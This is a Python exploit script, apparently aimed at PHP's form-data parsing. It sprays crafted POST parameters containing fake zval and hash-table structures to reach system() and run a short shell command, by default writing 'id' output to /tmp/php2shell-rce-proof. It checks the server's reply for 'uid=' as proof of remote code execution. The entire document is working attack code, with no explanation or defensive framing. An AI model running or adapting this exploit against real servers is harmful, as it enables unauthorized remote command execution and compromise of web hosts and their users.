import argparse
import socket
import struct

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=17433)
    ap.add_argument("--pad", type=int, default=1250000)
    ap.add_argument("--key", type=int, default=1000000)
    ap.add_argument("--sprays", type=int, default=3)
    ap.add_argument("--chunk", type=lambda v: int(v, 0))
    ap.add_argument("--system", type=lambda v: int(v, 0))
    ap.add_argument("--command", default="id>/tmp/php2shell-rce-proof")
    args = ap.parse_args()
    bucket_off = 64 + 32 * (args.sprays + 1)
    decoded = bytearray(b"B" * 295)
    controlled = args.chunk is not None and args.system is not None
    fake_ht_addr = args.chunk + 224 if controlled else 0x4141414141414141
    fake_zval = struct.pack("<QII", fake_ht_addr, 0x107, 0)
    decoded[bucket_off - 24:bucket_off - 8] = fake_zval
    decoded[bucket_off:bucket_off + 16] = fake_zval
    if controlled:
        cmd_addr = args.chunk + 280
        decoded[200:256] = struct.pack("<IIIIQIIIIQQ", 1, 7, 0x14, 0xFFFFFFFE, cmd_addr, 1, 1, 8, 0, 1, args.system)
        command = args.command.encode() + b"\x00"
        if len(command) > 28:
            raise SystemExit("command is limited to 27 bytes")
        decoded[256:256 + len(command)] = command
    raw = bytes(decoded[:283]) + b"".join(f"%{v:02X}".encode() for v in decoded[283:])
    body = b"0=" + b"A" * args.pad
    for i in range(1, args.sprays + 1):
        body += b"&" + str(i).encode() + b"=" + raw
    for i in range(1, args.sprays + 1):
        body += b"&" + str(i).encode() + b"=1"
    body += b"&" + b"Z" * args.key + b"[x]=1"
    req = (b"POST /index.php HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\n" + f"Content-Length: {len(body)}\r\n\r\n".encode() + body)
    response = bytearray()
    with socket.create_connection((args.host, args.port), timeout=10) as sock:
        sock.settimeout(15)
        sock.sendall(req)
        while True:
            try:
                data = sock.recv(65536)
            except (ConnectionResetError, TimeoutError):
                break
            if not data:
                break
            response.extend(data)
    print(f"body={len(body)} key={args.key} pad={args.pad} sprays={args.sprays}")
    print(bytes(response).split(b"\r\n", 1)[0].decode("ascii", "replace"))
    if b"uid=" in response:
        start = response.find(b"uid=")
        print(response[start:start + 200].decode("ascii", "replace"))

if __name__ == "__main__":
    main()

